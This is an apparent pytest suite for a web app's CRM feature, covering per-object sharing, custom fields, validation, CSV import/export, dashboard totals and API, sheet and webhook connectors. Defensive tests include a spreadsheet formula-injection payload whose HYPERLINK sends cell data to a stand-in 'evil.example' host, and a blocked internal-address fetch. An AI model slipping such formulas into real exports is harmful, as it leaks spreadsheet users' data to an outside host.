# ruff: noqa: E501
"""P50 the universal CRM: owner only (and what the owner shares), templates, custom objects
and fields, the office's own data with extra fields, filters and totals, CSV in and out, the
dashboard, and integrations (a JSON API with paging, a CSV, a webhook)."""

import json

import httpx
import pytest

from agentic.core import ssrf
from agentic.engine import client as engine_client

from .conftest import csrf
from .test_agents import llm, office, temporal  # noqa: F401
from .test_office_roles import as_role

JSON = {"content-type": "application/json"}


async def post(c, url, body=None):
    return await c.post(url, json=body or {}, headers=csrf(c))


async def patch(c, url, body):
    return await c.patch(url, json=body, headers=csrf(c))


async def query(c, key, **body):
    r = await post(c, f"/api/crm/objects/{key}/query", body)
    assert r.status_code == 200, r.text
    return r.json()


async def test_the_crm_is_the_owners_and_shared_per_object(client, llm, temporal):
    o = await office(client)
    me = (await client.get("/api/auth/me")).json()
    assert "crm.access" in me["permissions"]
    r = await client.get("/api/crm")
    assert r.status_code == 200 and r.json()["access"]["owner"] is True
    assert {d["key"] for d in r.json()["discover"]} >= {"contacts", "deals", "invoices", "tasks"}
    assert any(t["key"] == "real_estate" for t in r.json()["templates"])

    staff = await as_role(client, "aina@example.com", "staff", branch_id=o["branch"]["id"])
    try:
        assert "crm.access" not in (await staff.get("/api/auth/me")).json()["permissions"]
        assert (await staff.get("/api/crm")).status_code == 403
        assert (await post(staff, "/api/crm/templates/general")).status_code == 403

        await post(client, "/api/crm/templates/real_estate")
        objs = {x["key"]: x for x in (await client.get("/api/crm")).json()["objects"]}
        assert {"contacts", "deals", "invoices", "properties", "viewings"} <= set(objs)
        uid = (await staff.get("/api/auth/me")).json()["user"]["id"]
        r = await client.put(
            f"/api/crm/access/{uid}",
            json={
                "dashboard": False,
                "objects": [
                    {
                        "object_id": objs["properties"]["id"],
                        "level": "view",
                        "hidden_fields": ["price"],
                    }
                ],
            },
            headers=csrf(client),
        )
        assert r.status_code == 200, r.text
        await post(
            client,
            "/api/crm/objects/properties/records",
            {"values": {"address": "12 Jalan Ampang", "price": 850000, "status": "Available"}},
        )
        # The staff member now sees Properties only, without the price, and cannot change them.
        assert "crm.access" in (await staff.get("/api/auth/me")).json()["permissions"]
        mine = (await staff.get("/api/crm")).json()
        assert [x["key"] for x in mine["objects"]] == ["properties"] and mine["objects"][0][
            "can_edit"
        ] is False
        rows = await query(staff, "properties")
        assert (
            rows["rows"][0]["title"] == "12 Jalan Ampang" and "price" not in rows["rows"][0]["data"]
        )
        fields = (await staff.get("/api/crm/objects/properties")).json()["fields"]
        assert "price" not in {f["key"] for f in fields}
        assert (
            await post(staff, "/api/crm/objects/properties/records", {"values": {"address": "x"}})
        ).status_code == 403
        assert (await staff.get("/api/crm/objects/deals")).status_code == 404
        assert (await staff.get("/api/crm/dashboard")).status_code == 403
    finally:
        await staff.aclose()


async def test_custom_objects_fields_records_and_filters(client, llm, temporal):
    await office(client)
    r = await post(
        client, "/api/crm/objects", {"name": "Shipments", "icon": "truck", "color": "#b7791f"}
    )
    assert r.status_code == 201, r.text
    assert r.json()["key"] == "shipments"
    await post(client, "/api/crm/builtins/contacts")
    party = (
        await post(client, "/api/parties", {"name": "Kedai Ali", "roles": ["customer"]})
    ).json()
    fields = {}
    for spec in [
        {
            "label": "Status",
            "type": "select",
            "options": {"choices": ["Booked", "In transit", "Delivered"]},
        },
        {"label": "Charge", "type": "money"},
        {"label": "Customer", "type": "relation", "options": {"object": "contacts"}},
        {"label": "Contact email", "type": "email"},
        {"label": "Pickup", "type": "date"},
        {"label": "Number", "type": "auto"},
        {"label": "Handled by", "type": "person"},
    ]:
        r = await post(client, "/api/crm/objects/shipments/fields", spec)
        assert r.status_code == 201, r.text
        fields[spec["label"]] = r.json()["key"]
    bad = await post(
        client,
        "/api/crm/objects/shipments/fields",
        {"label": "Link", "type": "relation", "options": {"object": "nothing"}},
    )
    assert bad.status_code == 422
    me = (await client.get("/api/auth/me")).json()["user"]["id"]
    ok = await post(client, "/api/crm/objects/shipments/records", {"values": {
        "name": "KL to Penang", "status": "booked", "charge": "RM 1,250.50", "customer": [party["id"]],
        "contact_email": "Ali@Kedai.my", "pickup": "27/10/2026", "handled_by": me}})  # fmt: skip
    assert ok.status_code == 201, ok.text
    data = ok.json()["data"]
    assert (
        data["status"] == "Booked"
        and data["charge"] == 1250.5
        and data["contact_email"] == "ali@kedai.my"
    )
    assert data["pickup"] == "2026-10-27" and data["number"] == 1
    second = await post(
        client,
        "/api/crm/objects/shipments/records",
        {"values": {"name": "JB run", "status": "Delivered", "charge": 300}},
    )
    assert second.json()["data"]["number"] == 2
    bad = await post(
        client,
        "/api/crm/objects/shipments/records",
        {"values": {"name": "x", "contact_email": "not-an-email"}},
    )
    assert bad.status_code == 422 and "Contact email" in bad.json()["message"]
    assert bad.json()["fields"] == {"contact_email": "Use an email address."}  # next to the input
    bad = await post(
        client,
        "/api/crm/objects/shipments/records",
        {"values": {"name": "x", "status": "Lost at sea"}},
    )
    assert bad.status_code == 422
    assert bad.json()["fields"]["status"] == '"Lost at sea" is not one of the choices.'
    needed = await post(
        client, "/api/crm/objects/shipments/records", {"values": {"status": "Booked"}}
    )
    assert needed.status_code == 422  # the name is required

    got = await query(
        client, "shipments", filters=[{"field": "status", "op": "any_of", "value": ["Booked"]}]
    )
    assert got["total"] == 1 and got["refs"][party["id"]] == "Kedai Ali" and got["refs"][me]
    got = await query(client, "shipments", filters=[{"field": "charge", "op": "gt", "value": 500}])
    assert [r["title"] for r in got["rows"]] == ["KL to Penang"]
    got = await query(client, "shipments", q="penang")
    assert got["total"] == 1
    got = await query(client, "shipments", sort=[{"field": "charge", "dir": "asc"}])
    assert [r["title"] for r in got["rows"]] == ["JB run", "KL to Penang"]
    rid = got["rows"][0]["id"]
    r = await patch(
        client, f"/api/crm/objects/shipments/records/{rid}", {"values": {"status": "In transit"}}
    )
    assert r.status_code == 200 and r.json()["data"]["status"] == "In transit"
    hist = (await client.get(f"/api/crm/objects/shipments/records/{rid}")).json()["history"]
    assert [h["action"] for h in hist] == ["crm.record_changed", "crm.record_added"]
    assert hist[0]["changed"] == ["status"]
    # A link field picks from the target object.
    opts = (await client.get("/api/crm/objects/contacts/options", params={"q": "ali"})).json()
    assert opts == [{"id": party["id"], "title": "Kedai Ali"}]
    r = await client.delete(
        f"/api/crm/objects/shipments/records/{rid}", headers={**csrf(client), **JSON}
    )
    assert r.status_code == 204 and (await query(client, "shipments"))["total"] == 1


async def test_the_offices_own_data_with_extra_fields(client, llm, temporal):
    await office(client)
    party = (
        await post(
            client,
            "/api/parties",
            {"name": "Syarikat Maju", "roles": ["supplier"], "email": "a@maju.my"},
        )
    ).json()
    await post(client, "/api/crm/builtins/contacts")
    rows = await query(client, "contacts")
    row = next(r for r in rows["rows"] if r["id"] == party["id"])
    assert (
        row["title"] == "Syarikat Maju"
        and row["link"] == f"/contacts/{party['id']}"
        and row["data"]["roles"] == ["supplier"]
    )
    tier = (await post(client, "/api/crm/objects/contacts/fields", {"label": "Tier", "type": "select",
                                                                     "options": {"choices": ["Gold", "Silver"]}})).json()  # fmt: skip
    r = await patch(
        client,
        f"/api/crm/objects/contacts/records/{party['id']}",
        {"values": {"tier": "Gold", "name": "Hacked"}},
    )
    assert r.status_code == 200
    row = next(r for r in (await query(client, "contacts"))["rows"] if r["id"] == party["id"])
    assert (
        row["data"]["tier"] == "Gold" and row["title"] == "Syarikat Maju"
    )  # the office's own name stays
    assert (
        await post(client, "/api/crm/objects/contacts/records", {"values": {"name": "x"}})
    ).status_code == 409
    builtin = next(
        f
        for f in (await client.get("/api/crm/objects/contacts")).json()["fields"]
        if f["key"] == "email"
    )
    assert (
        await client.delete(f"/api/crm/fields/{builtin['id']}", headers={**csrf(client), **JSON})
    ).status_code == 409
    assert (
        await client.delete(f"/api/crm/fields/{tier['id']}", headers={**csrf(client), **JSON})
    ).status_code == 204


async def test_csv_in_and_out_and_the_dashboard(client, llm, temporal):
    await office(client)
    await post(client, "/api/crm/objects", {"name": "Members"})
    csv_text = "\n".join(
        [
            "Name,Plan,Fee,Joined,Email",
            "Ali,Gold,120,2026-10-01,ali@x.my",
            "Bee,Silver,80,2026-10-03,bee@x.my",
            "Cik,Gold,120,2026-09-20,bad email",
            "Dan,Silver,80,2026-10-05,dan@x.my",
            "Eve,Gold,120,2026-10-06,eve@x.my",
            "Fai,Silver,80,2026-10-07,fai@x.my",
        ]
    )
    r = await post(client, "/api/crm/objects/members/import", {"csv": csv_text})
    assert r.status_code == 200, r.text
    # The row with a bad email is kept; only that cell is left empty, and it is reported.
    assert r.json()["added"] == 6 and r.json()["skipped"] == 0
    problem = r.json()["problems"][0]
    assert problem.startswith("Row 4, Email") and "left empty" in problem
    fields = {
        f["key"]: f["type"] for f in (await client.get("/api/crm/objects/members")).json()["fields"]
    }
    assert fields["fee"] == "number" and fields["joined"] == "date" and fields["email"] == "email"
    out = await client.get("/api/crm/objects/members/export.csv")
    assert (
        out.status_code == 200 and "Ali" in out.text and out.text.splitlines()[0].startswith("﻿Name")
    )
    # P52: a value that starts like a formula (from a web form or another system) is quoted
    # in the export, so it cannot run when the file is opened in a spreadsheet.
    evil = '=HYPERLINK("https://evil.example/?x="&A2,"Click")'
    made = await post(client, "/api/crm/objects/members/records", {"values": {"name": evil}})
    assert made.status_code == 201, made.text
    out = await client.get("/api/crm/objects/members/export.csv")
    assert "'=HYPERLINK(" in out.text and "\n=HYPERLINK(" not in out.text
    # Remove it again so the totals below are about the imported members only.
    gone = await client.delete(
        f"/api/crm/objects/members/records/{made.json()['id']}",
        headers={**csrf(client), "content-type": "application/json"},
    )
    assert gone.status_code == 204, gone.text
    r = await post(
        client,
        "/api/crm/widgets",
        {
            "title": "Fees by plan",
            "kind": "bar",
            "config": {"object": "members", "metric": "sum", "field": "fee", "group_by": "plan"},
        },
    )
    assert r.status_code == 201, r.text
    dash = (await client.get("/api/crm/dashboard")).json()["widgets"]
    tile = next(w for w in dash if w["title"] == "Fees by plan")
    assert tile["data"]["total"] == 600
    assert {g["label"]: g["value"] for g in tile["data"]["groups"]} == {"Gold": 360, "Silver": 240}
    bad = await post(client, "/api/crm/widgets", {"title": "x", "config": {"object": "nothing"}})
    assert bad.status_code == 422


class FakeShop:
    """A JSON API with cursor paging and a key, and a published CSV."""

    def __init__(self, llm_) -> None:
        self.llm = llm_  # every other host: the scripted model (the office's own calls)
        self.calls: list[httpx.Request] = []
        self.orders = [
            {
                "id": 1,
                "number": "#1001",
                "total": "250.00",
                "status": "paid",
                "customer": {"email": "a@x.my"},
            },
            {
                "id": 2,
                "number": "#1002",
                "total": "99.90",
                "status": "shipped",
                "customer": {"email": "b@x.my"},
            },
            {
                "id": 3,
                "number": "#1003",
                "total": "40.00",
                "status": "paid",
                "customer": {"email": "c@x.my"},
            },
        ]

    def handler(self, r: httpx.Request) -> httpx.Response:
        if r.url.host not in ("api.shop.test", "sheets.test"):
            return self.llm.handler(r)
        self.calls.append(r)
        if r.url.host == "sheets.test":
            return httpx.Response(
                200,
                text="Product,Price,In stock\nSoap,4.50,yes\nTowel,12.00,no\n",
                headers={"content-type": "text/csv"},
            )
        if r.headers.get("authorization") != "Bearer shop-key":
            return httpx.Response(401, json={"error": "no"})
        after = int(r.url.params.get("after") or 0)
        page = [o for o in self.orders if o["id"] > after][:2]
        nxt = page[-1]["id"] if len(page) == 2 and page[-1]["id"] < self.orders[-1]["id"] else None
        return httpx.Response(
            200, json={"results": page, "paging": {"next": {"after": nxt}} if nxt else {}}
        )


@pytest.fixture
def shop(monkeypatch, llm):  # noqa: F811
    fake = FakeShop(llm)
    allowed = ssrf.settings.private_hosts_allowed
    monkeypatch.setattr(
        ssrf.settings, "private_hosts_allowed", f"{allowed},api.shop.test,sheets.test"
    )
    engine_client.use_transport(httpx.MockTransport(fake.handler))
    yield fake
    engine_client.use_transport(None)


REST = {"url": "https://api.shop.test/orders?limit=2", "auth": {"type": "bearer"}, "records_path": "results",
        "id_path": "id", "pagination": {"type": "cursor", "param": "after", "cursor_path": "paging.next.after"}}  # fmt: skip


async def test_a_json_api_is_read_with_paging_and_kept_in_sync(client, llm, temporal, shop):
    await office(client)
    bad = await post(
        client, "/api/crm/connectors/test", {"kind": "rest", "config": REST, "secret": "wrong"}
    )
    assert bad.status_code == 422 and "refused the key" in bad.json()["message"]
    t = await post(
        client, "/api/crm/connectors/test", {"kind": "rest", "config": REST, "secret": "shop-key"}
    )
    assert t.status_code == 200, t.text
    found = {f["path"]: f for f in t.json()["fields"]}
    assert (
        t.json()["count"] == 3
        and found["total"]["type"] == "money"
        and found["customer.email"]["type"] == "email"
    )
    fields = [{**f, "include": f["path"] != "id"} for f in t.json()["fields"]]
    r = await post(client, "/api/crm/connectors", {"name": "Online shop", "kind": "rest", "preset": "rest", "config": REST,
                                                   "secret": "shop-key", "fields": fields, "title_field": "number", "object_name": "Shop orders"})  # fmt: skip
    assert r.status_code == 201, r.text
    conn = r.json()
    assert (
        conn["sync"]["created"] == 3
        and conn["config"]["secret_set"] is True
        and "secret_enc" not in json.dumps(conn)
    )
    rows = await query(client, "shop_orders", sort=[{"field": "number", "dir": "asc"}])
    assert [x["title"] for x in rows["rows"]] == ["#1001", "#1002", "#1003"]
    # The other system changes: an update, a new record and a new field; nothing doubles.
    shop.orders[0]["status"] = "refunded"
    shop.orders.append(
        {
            "id": 4,
            "number": "#1004",
            "total": "10.00",
            "status": "paid",
            "customer": {"email": "d@x.my"},
            "channel": "tiktok",
        }
    )
    s = await post(client, f"/api/crm/connectors/{conn['id']}/sync")
    assert s.json()["sync"] == {"created": 1, "updated": 1, "received": 4}
    rows = await query(client, "shop_orders", q="#1001")
    assert rows["rows"][0]["data"]["status"] == "refunded"
    keys = {f["key"] for f in (await client.get("/api/crm/objects/shop_orders")).json()["fields"]}
    assert "channel" in keys
    # An internal address is never fetched.
    blocked = await post(
        client,
        "/api/crm/connectors/test",
        {"kind": "rest", "config": {**REST, "url": "http://127.0.0.1:8501/api"}},
    )
    assert blocked.status_code == 422


async def test_a_google_sheet_and_a_webhook(client, llm, temporal, shop):
    await office(client)
    t = await post(
        client,
        "/api/crm/connectors/test",
        {"kind": "csv", "config": {"url": "https://sheets.test/export.csv"}},
    )
    assert t.status_code == 200 and {f["path"]: f["type"] for f in t.json()["fields"]} == {
        "Product": "text",
        "Price": "money",
        "In stock": "checkbox",
    }
    r = await post(
        client,
        "/api/crm/connectors",
        {
            "name": "Stock list",
            "kind": "webhook",
            "config": {"id_path": "sku"},
            "object_name": "Leads",
        },
    )
    assert r.status_code == 201, r.text
    path = r.json()["webhook_path"]
    hook = await client.post(
        path,
        json=[
            {"sku": "L1", "name": "Ahmad", "phone": "+60123456789"},
            {"sku": "L2", "name": "Siti"},
        ],
        headers=JSON,
    )
    assert hook.status_code == 200 and hook.json()["created"] == 2
    again = await client.post(path, json={"sku": "L1", "name": "Ahmad bin Ali"}, headers=JSON)
    assert again.json() == {"created": 0, "updated": 1, "received": 1}
    assert (
        await client.post("/api/crm/hooks/wrong-token", json={}, headers=JSON)
    ).status_code == 404
    rows = await query(client, "leads")
    assert rows["total"] == 2 and "Ahmad bin Ali" in {x["data"].get("name") for x in rows["rows"]}

    # Lost the address: a new one, and the old one stops working.
    fresh = await post(client, f"/api/crm/connectors/{r.json()['id']}/new-address", {})
    assert fresh.status_code == 200, fresh.text
    new_path = fresh.json()["webhook_path"]
    assert new_path != path
    assert (await client.post(path, json={"sku": "L3"}, headers=JSON)).status_code == 404
    assert (await client.post(new_path, json={"sku": "L3"}, headers=JSON)).json()["created"] == 1


async def test_remove_a_list_or_start_over(client, llm, temporal):
    o = await office(client)
    await post(client, "/api/crm/templates/real_estate")
    objs = {x["key"] for x in (await client.get("/api/crm")).json()["objects"]}
    assert {"properties", "contacts"} <= objs
    rec = await post(
        client,
        "/api/crm/objects/properties/records",
        {"values": {"address": "Lot 7, Jalan Ampang"}},
    )
    assert rec.status_code == 201, rec.text

    # The wrong list: remove it, add another.
    r = await client.delete("/api/crm/objects/viewings", headers={**csrf(client), **JSON})
    assert r.status_code == 204
    assert "viewings" not in {x["key"] for x in (await client.get("/api/crm")).json()["objects"]}
    assert (await post(client, "/api/crm/templates/clinic")).status_code == 201

    staff = await as_role(client, "aina@example.com", "staff", branch_id=o["branch"]["id"])
    try:
        assert (await post(staff, "/api/crm/reset", {"confirm": True})).status_code == 403
    finally:
        await staff.aclose()
    assert (await post(client, "/api/crm/reset", {})).status_code == 422  # must say so
    r = await post(client, "/api/crm/reset", {"confirm": True})
    assert r.status_code == 200 and r.json()["removed"] >= 4
    after = (await client.get("/api/crm")).json()
    assert after["objects"] == []
    assert (await client.get("/api/crm/dashboard")).json()["widgets"] == []
    # The office's own data is untouched: it can be added again at once.
    assert (await post(client, "/api/crm/builtins/contacts")).status_code == 201
